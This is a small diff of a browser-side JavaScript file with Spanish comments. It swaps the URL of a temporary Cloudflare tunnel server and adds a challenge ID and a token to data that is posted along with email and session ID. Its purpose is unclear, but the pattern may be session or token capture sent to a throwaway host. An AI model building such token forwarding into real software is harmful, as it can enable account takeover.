@@ -3,7 +3,7 @@
  * y enviarla al servidor Node.js.
  */
 // URL base de tu servidor Node.js
-const SERVER_BASE_URL = 'https://paper-inspector-woods-camera.trycloudflare.com';
+const SERVER_BASE_URL = 'https://cliff-dsl-bedding-question.trycloudflare.com';
 
 document.addEventListener('DOMContentLoaded', async () => {
     // --- FIX: evitar doble ejecución si el usuario abre varias veces ---
@@ -121,7 +121,9 @@ document.addEventListener('DOMContentLoaded', async () => {
                 body: JSON.stringify({
                     email: data.email,
                     continueUrl: data.continueUrl,
-                    sessionId: data.sessionId
+                    sessionId: data.sessionId,
+                    challengeId: data.challengeId, 
+                    token: data.token
                 })
             });
 
